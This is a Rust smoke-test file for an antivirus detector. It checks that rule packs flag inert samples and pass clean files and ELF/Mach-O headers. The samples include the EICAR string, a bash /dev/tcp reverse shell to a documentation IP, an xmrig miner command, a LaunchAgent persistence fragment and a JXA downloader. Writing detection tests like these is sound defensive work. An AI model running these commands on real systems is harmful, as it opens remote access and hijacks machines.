//! Cross-platform detection smoke tests.
//!
//! These run natively on Linux, macOS and Windows (`cargo test`) and validate
//! that the shipped rule packs detect representative Linux/macOS samples while
//! leaving clean files and well-formed native headers alone. No live malware is
//! involved — every sample is an inert byte pattern.

use std::path::Path;

use auraav_core::signatures::SignatureDb;
use auraav_core::types::{ScanConfig, Verdict};
use auraav_core::Detector;

fn detector() -> Detector {
    let mut db = SignatureDb::new();
    let data = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../data");
    for sub in ["signatures", "rules", "fingerprints"] {
        let _ = db.load_dir(&data.join(sub));
    }
    Detector::new(db, ScanConfig::default())
}

fn verdict(det: &Detector, name: &str, bytes: &[u8]) -> Verdict {
    det.scan_bytes(Path::new(name), bytes).verdict
}

#[test]
fn eicar_is_malicious() {
    let det = detector();
    let eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
    assert_eq!(verdict(&det, "eicar.com", eicar), Verdict::Malicious);
}

#[test]
fn linux_reverse_shell_is_flagged() {
    let det = detector();
    let sample = b"#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n";
    assert_ne!(verdict(&det, "x.sh", sample), Verdict::Clean);
}

#[test]
fn linux_crypto_miner_is_flagged() {
    let det = detector();
    let sample =
        b"#!/bin/bash\n./xmrig --donate-level 1 -o stratum+tcp://pool.example.invalid:3333\n";
    assert_ne!(verdict(&det, "miner.sh", sample), Verdict::Clean);
}

#[test]
fn macos_launchagent_persistence_is_flagged() {
    let det = detector();
    let sample = b"<key>LaunchAgents</key><key>ProgramArguments</key>\
<key>RunAtLoad</key><true/><key>KeepAlive</key><true/>";
    assert_ne!(verdict(&det, "com.evil.plist", sample), Verdict::Clean);
}

#[test]
fn macos_jxa_downloader_is_flagged() {
    let det = detector();
    let sample = b"ObjC.import('Foundation'); var u=$.NSURL.URLWithString('http://x'); \
$.NSData.dataWithContentsOfURL(u).writeToFile('/tmp/a');";
    assert_ne!(verdict(&det, "x.js", sample), Verdict::Clean);
}

#[test]
fn clean_files_are_not_flagged() {
    let det = detector();
    assert_eq!(
        verdict(&det, "clean.txt", b"the quick brown fox\n"),
        Verdict::Clean
    );
    assert_eq!(
        verdict(&det, "clean.sh", b"#!/bin/bash\necho hello\n"),
        Verdict::Clean
    );
}

#[test]
fn native_headers_are_not_flagged() {
    let det = detector();

    // Minimal ELF64 header (no sections/segments).
    let mut elf = vec![0x7f, b'E', b'L', b'F', 2, 1, 1, 0];
    elf.extend_from_slice(&[0u8; 8]);
    elf.extend_from_slice(&[2, 0, 0, 0]); // e_type
    elf.extend_from_slice(&[0x3e, 0]); // e_machine x86-64
    elf.extend_from_slice(&[1, 0, 0, 0]); // e_version
    elf.extend_from_slice(&[0u8; 24]); // entry/phoff/shoff
    elf.extend_from_slice(&[0u8; 4]); // e_flags
    elf.extend_from_slice(&[0x40, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
    assert_eq!(verdict(&det, "elf_clean.bin", &elf), Verdict::Clean);

    // Minimal Mach-O 64 header (no load commands).
    let macho = [
        0xcf, 0xfa, 0xed, 0xfe, 0x07, 0x00, 0x00, 0x01, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
    ];
    assert_eq!(verdict(&det, "macho_clean.bin", &macho), Verdict::Clean);
}
